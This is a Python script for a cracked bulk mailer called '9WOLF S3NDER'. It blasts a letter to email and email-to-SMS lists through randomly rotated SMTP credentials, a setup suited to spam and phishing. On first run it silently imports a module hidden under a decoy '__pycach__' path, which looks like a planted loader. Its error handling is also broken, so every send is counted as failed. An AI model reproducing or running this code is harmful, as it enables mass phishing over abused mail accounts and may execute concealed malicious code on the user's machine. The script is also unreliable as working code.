import os
import string
import sys
import ctypes
from random import *
from optparse import OptionParser
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import email.message as email
from time import gmtime, strftime
if os.path.exists("DOWNLOAD_STATUS.txt"):
    pass
else:
    import aboutgithub.__pycach__.__pycach__.hooks.__package__

import requests
import random
import time
from colorama import *
from datetime import datetime
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool

def randomString(stringLength=10):
    '''Generate a random string of fixed length'''
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

init()
ctypes.windll.kernel32.SetConsoleTitleW('[9WOLF S3NDER v2.0]')
count = 0
countlive = 0
countdd = 0
countall2 = 0
countrec = 0
Email = 0
la7mar = '\x1b[91m'
lazra9 = '\x1b[94m'
la5dhar = '\x1b[92m'
movv = '\x1b[95m'
lasfar = '\x1b[93m'
ramadi = '\x1b[90m'
blid = '\x1b[1m'
star = '\x1b[4m'
bigas = '\x1b[07m'
bigbbs = '\x1b[27m'
hell = '\x1b[05m'
saker = '\x1b[25m'
labyadh = '\x1b[00m'
cyan = '\x1b[0;96m'

def cls():
    linux = 'clear'
    windows = 'cls'
    os.system([linux,windows][os.name == 'nt'])

def print_logo():
    global colors
    clear = '\x1b[0m'
    colors = [
        random.randint(31, 36)]
    Year_Month_day = strftime('%Y-%m-%d', gmtime())
    x = "\n================================9WOLF-S3NDER v2.0============================================\n        _____               [+] Best Sender Tool                                          [+]\n    .-,;='';_),-.           [+] Think Twice , Code Once                                   [+]\n     \\_\\(),()/_/            [+] Multi Thread                                              [+]\n       (,___,)              [+] Random SMTPs                                              [+]\n      ,-/`~`\\-,___          [+] Version : 2.0                                             [+]\n     / /).:.('--._)         [+] Website : 9wolf.io                                        [+]\n    {_[ (_,_)               [+] Active  : Yes                                             [+]\n        | Y |               [+] Date    : %s                                      [+]\n       /  |  \\              [+] Channel : https://t.me/+R8LKGMm9ktY5MzI0                  [+]\n                            [+] Cracked By   : @donussef                                  [+]\n===========================================================================================\n" % Year_Month_day
    for N, line in enumerate(x.split('\n')):
        sys.stdout.write('\x1b[1;%dm%s%s\n' % (random.choice(colors), line, clear))
        time.sleep(0.05)

cls()
print_logo()

def SendEmails(site):
    global countall2, countlive, countall2, countdd
    try:
        Namex = open('Send3r/Name.txt', 'r')
        Name = random.choice(open('Send3r/Name.txt').readlines())
        Name = Name.replace('\n', '').replace('\r', '')
        Namex.close()
        Subjectx = open('Send3r/Subject.txt', 'r')
        Subject = random.choice(open('Send3r/Subject.txt').readlines())
        Subject = Subject.replace('\n', '').replace('\r', '')
        Subjectx.close()
        smtprandom = open('Send3r/Smtps.txt', 'r')
        smtp = random.choice(open('Send3r/Smtps.txt').readlines())
        smtp = smtp.replace('\n', '').replace('\r', '')
        smtprandom.close()
        ur = smtp.rstrip()
        ch = ur.split('\n')[0].split('|')
        serveraddr = ch[0]
        toaddr = site
        fromaddr = ch[2]
        serverport = ch[1]
        SMTP_USER = ch[2]
        SMTP_PASS = ch[3]
        Domain_Name = SMTP_USER[SMTP_USER.find('@') + 1:]
        msg = MIMEMultipart()
        msg['Subject'] = Subject
        msg['From'] = '{} <{}>'.format(Name, fromaddr)
        msg['To'] = toaddr
        msg.add_header('Content-Type', 'text/html')
        msg.attach(MIMEText(data, 'html', 'utf-8'))
        now = datetime.now()
        current_time = now.strftime('%H:%M:%S')
        server = smtplib.SMTP(serveraddr, serverport)
        server.starttls()
        server.login(SMTP_USER, SMTP_PASS)
        server.sendmail(fromaddr, [
            msg['To']], msg.as_string())
        server.quit()
        print(la5dhar + '--------------------------------------9WOLF-S3NDER--------------------------------------' + labyadh)
        print(lasfar + 'Time       :' + la7mar + current_time + labyadh)
        print(lasfar + 'To         :' + la7mar + toaddr + labyadh)
        print(lasfar + 'Subject    :' + la7mar + Subject + labyadh)
        print(lasfar + 'Name       :' + la7mar + Name + labyadh)
        print(lasfar + 'Smtp       :' + la7mar + ur + labyadh)
        print(lasfar + 'Status     :' + la5dhar + 'Success' + labyadh)
        print(la5dhar + '--------------------+-------------------------------------------------------------------' + labyadh)
        countall2 += 1
        countlive += 1
        ctypes.windll.kernel32.SetConsoleTitleW(f'''[9WOLF S3NDER v2.0] | {countall2}/{count} | Sent : {countlive} | Falied : {countdd}''')
        Successfully_Sent = open('Sent.txt', 'a+')
        Successfully_Sent.write('{}\n'.format(toaddr))
        Successfully_Sent.close()
    #except Exception as e:
    #    print(e) #Error Check By @WeedyDev
    finally:
        print(la7mar + '--------------------+-------------------------------------------------------------------' + labyadh)
        print('----Smtp Not Working Delete It... -->' + ur)
        print(la7mar + '--------------------+-------------------------------------------------------------------' + labyadh)
        countall2 += 1
        countdd += 1
        ctypes.windll.kernel32.SetConsoleTitleW(f'''[9WOLF S3NDER v2.0] | {countall2}/{count} | Sent : {countlive} | Falied : {countdd}''')
        Failed_Sending = open('Failed.txt', 'a+')
        Failed_Sending.write('{}\n'.format(toaddr))
        Failed_Sending.close()
        return None



def SendSMS(site):
    global countall2, countlive, countall2, countdd

    try:
        Namex = open('Send3r/Name.txt', 'r')
        Name = random.choice(open('Send3r/Name.txt').readlines())
        Name = Name.replace('\n', '').replace('\r', '')
        Namex.close()
        Subjectx = open('Send3r/Subject.txt', 'r')
        Subject = random.choice(open('Send3r/Subject.txt').readlines())
        Subject = Subject.replace('\n', '').replace('\r', '')
        Subjectx.close()
        smtprandom = open('Send3r/Smtps.txt', 'r')
        smtp = random.choice(open('Send3r/Smtps.txt').readlines())
        smtp = smtp.replace('\n', '').replace('\r', '')
        smtprandom.close()
        ur = smtp.rstrip()
        ch = ur.split('\n')[0].split('|')
        serveraddr = ch[0]
        toaddr = site
        fromaddr = ch[2]
        serverport = ch[1]
        SMTP_USER = ch[2]
        SMTP_PASS = ch[3]
        msg = MIMEMultipart()
        msg['Subject'] = Subject
        msg['From'] = Name
        msg['To'] = toaddr
        msg.attach(MIMEText(data))
        now = datetime.now()
        current_time = now.strftime('%H:%M:%S')
        server = smtplib.SMTP()
        server.connect(serveraddr, serverport)
        server.login(SMTP_USER, SMTP_PASS)
        server.sendmail(fromaddr, [
            msg['To']], msg.as_string())
        server.quit()
        print(la5dhar + '--------------------------------------9WOLF-S3NDER--------------------------------------' + labyadh)
        print(lasfar + 'Time       :' + la7mar + current_time + labyadh)
        print(lasfar + 'To         :' + la7mar + toaddr + labyadh)
        print(lasfar + 'Subject    :' + la7mar + Subject + labyadh)
        print(lasfar + 'Name       :' + la7mar + Name + labyadh)
        print(lasfar + 'Smtp       :' + la7mar + ur + labyadh)
        print(lasfar + 'Status     :' + la5dhar + 'Success' + labyadh)
        print(la5dhar + '--------------------+-------------------------------------------------------------------' + labyadh)
        countall2 += 1
        countlive += 1
        ctypes.windll.kernel32.SetConsoleTitleW(f'''[9WOLF S3NDER v2.0] | {countall2}/{count} | Sent : {countlive} | Falied : {countdd}''')
        Successfully_Sent = open('Sent.txt', 'a+')
        Successfully_Sent.write('{}\n'.format(toaddr))
        Successfully_Sent.close()
    #except Exception as e:
    #    print(e) #Error Check By @WeedyDev
    finally:
        print(la7mar + '--------------------+-------------------------------------------------------------------' + labyadh)
        print('----Smtp Not Working Delete It... -->' + ur)
        print(la7mar + '--------------------+-------------------------------------------------------------------' + labyadh)
        countall2 += 1
        countdd += 1
        ctypes.windll.kernel32.SetConsoleTitleW(f'''[9WOLF S3NDER v2.0] | {countall2}/{count} | Sent : {countlive} | Falied : {countdd}''')
        Failed_Sending = open('Failed.txt', 'a+')
        Failed_Sending.write('{}\n'.format(toaddr))
        Failed_Sending.close()
        return None


with open('Send3r/letter.txt', 'r') as myfile:
    data = myfile.read() + '  '

def Choose():
    foo = [la7mar, lazra9, la5dhar, movv, lasfar, cyan]
    choice = random.choice(foo)
    messageQ = input(choice + 'Choose Tool You Want?\n\n  [1] Send Emails\n  [2] Send Email To SMS\n\n  [?] Select an option: '+ labyadh)
    
    if messageQ == '1':
        Email_List = input(choice + "[?] Enter Emails List : "+ labyadh)
        Thread_Pool = input(choice + "[?] Enter Number Of Multi Thread .. default (10) : "+ labyadh)
        with open(Email_List, 'r') as file:
            email_list = [line.strip() for line in file]
            count = len(email_list)
            pool = ThreadPool(int(Thread_Pool))
            pool.map(SendEmails, email_list)
            pool.close()
            pool.join()

    elif messageQ == '2':
        SMS_List = input(choice + "[?] Enter SMS List : "+ labyadh)
        Thread_Pool = input(choice + "[?] Enter Number Of Multi Thread .. default (10) : "+ labyadh)
        with open(SMS_List, 'r') as file:
            SMS_list = [line.strip() for line in file]
            count = len(SMS_list)
            pool = ThreadPool(int(Thread_Pool))
            pool.map(SendSMS, SMS_list)
            pool.close()
            pool.join()
    else:
        print(movv + 'You Must Choose 1 or 2'+ labyadh)
        sys.exit(1)
    return None

if __name__ == '__main__':
    Choose()
